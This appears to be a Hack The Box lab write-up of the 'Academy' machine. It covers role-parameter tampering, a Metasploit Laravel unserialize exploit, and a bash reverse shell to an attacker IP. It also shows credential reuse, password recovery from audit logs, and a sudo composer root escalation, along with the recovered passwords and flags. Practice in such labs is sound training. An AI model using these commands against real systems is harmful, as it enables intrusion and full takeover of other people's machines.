---
title: "Academy from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Academy from HTB
`nmap` gave this
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open     mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

add this to `/etc/hosts`
```
10.10.10.215 academy.htb
```
After accessing the site click `Register`and signup
Then for `directory enumeration`
```bash
dirsearch -u http://academy.htb

[15:53:38] 200 -  968B  - /admin.php
[15:53:51] 200 -    0B  - /config.php
[15:53:59] 302 -   54KB - /home.php  ->  login.php
[15:53:59] 301 -  311B  - /images  ->  http://academy.htb/images/
[15:53:59] 403 -  276B  - /images/
[15:54:03] 200 -  964B  - /login.php
[15:54:13] 200 - 1001B  - /register.php
```
From here `/admin.php` is interesting, it takes us to `login page` but shows nothing interesting. Lets create new user from `/register.php`but now let's use `burpsuite + intercept`to see what's happening in background
```
uid=shavigio1&password=shavigio1&confirm=shavigio1&roleid=0
```
Let's change `roleid`and see what it does
```
uid=shavigio1&password=shavigio1&confirm=shavigio1&roleid=1
```
After forwarding we are taken to `http://academy.htb/login.php` then login with user you just created, But it gives us nothing, But let's see `/admin.php` we get this:
```
Item	Status
Complete initial set of modules (cry0l1t3 / mrb3n)	done
Finalize website design	done
Test all modules	done
Prepare launch campaign	done
Separate student and admin roles	done
Fix issue with dev-staging-01.academy.htb	pending
```
We see subdomain `dev-staging-01` add that to `/etc/hosts` and open that subdomain
after eploring we can read that it uses `laravel` but we don't know the version so we have to risk it.
In `searchsploit` search `laravel` and we'll use
```
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)                                                   | linux/remote/47129.rb
```
in `Metasploit`
```bash
msf6 > search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
   2    \_ target: Unix (In-Memory)                     .                .          .      .
   3    \_ target: Windows (In-Memory)                  .                .          .      .


msf6 > use  exploit/unix/http/laravel_token_unserialize_exec
[*] Using configured payload cmd/unix/reverse_perl


msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LHOST 10.10.16.11
LHOST => 10.10.16.11
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set LPORT 1234
LPORT => 1234
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOST 10.10.10.215
RHOST => 10.10.10.215
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set RHOST dev-staging-01.academy.htb
RHOST => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set VHOST dev-staging-01.academy.htb
VHOST => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.16.11:1234
[*] Command shell session 1 opened (10.10.16.11:1234 -> 10.10.10.215:52356) at 2024-09-07 16:36:34 +0400
ls
css
favicon.ico
index.php
js
robots.txt
web.config
```
We got interactive shell. Yippe!
then to get fully interactive reverse shell use this payload
```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.11/9001 0>&1'
```
this will give connection on `netcat`
```bash
 rlwrap nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.215] 41170
bash: cannot set terminal process group (1021): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```
in `/var/www/html/academy$`we find `.env` file which contains password for `mysql login` but none of the mentioned names in that file gives us connection to `mysql`so we'll have to use one of the users from `/etc/passwd`, well we didn't get connection on `mysql`but we can switch to `cry0l1t3` with this password
```bash
su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ id
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```
User Flag is:
```
773ba55ce9af653ba3a98522f5ed83ca
```
reading the output `id` gives the `adm` group is interesting
>adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.

listing the files in `/var/log/` we see `audit` which may contain password for other user to read `audit logs` we have to use
```bash
aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
```
Now we can switch to `mrb3n`
```bash
$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```
So we can run `composer` with root Permission
in https://gtfobins.github.io/gtfobins/composer/ we can do privilege escalation
```bash
$ TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x

Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# # id
id
uid=0(root) gid=0(root) groups=0(root)
```
The Root Flag is:
```
eb28f848975237f3a2b2c41a63edef9e
```
![](/assets/images/2024-09-07_17-07-48.png)

